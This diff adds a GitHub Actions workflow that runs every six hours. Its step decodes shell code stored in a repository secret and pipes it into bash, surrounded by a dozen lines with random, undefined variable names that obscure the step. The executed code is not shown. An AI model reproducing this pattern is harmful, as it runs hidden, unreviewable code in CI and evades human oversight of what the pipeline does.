@@ -1,0 +1,29 @@
+name: miaorongdongfeng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: miaorongdongfeng
+        env:
+          g514: ${{ secrets.g514 }}
+        run: |
+          echo $g514 | jq -r .g33 | /bin/bash
+          echo $d93395 | jq -r .cys3 | /bin/bash
+          echo $buhn06185 | jq -r .it24592 | /bin/bash
+          echo $hsoc40 | jq -r .ira421 | /bin/bash
+          echo $tq215 | jq -r .zlut4 | /bin/bash
+          echo $qaqcx574 | jq -r .fdf26097 | /bin/bash
+          echo $c20 | jq -r .vx9580 | /bin/bash
+          echo $lzwqv4 | jq -r .tuq69 | /bin/bash
+          echo $tclpq8 | jq -r .zm8 | /bin/bash
+          echo $cnetj10792 | jq -r .xfv12 | /bin/bash
+          echo $bzvn9 | jq -r .o3 | /bin/bash
+          echo $mwd115 | jq -r .cgqt405 | /bin/bash
+          echo $pv714 | jq -r .gryok4 | /bin/bash
+
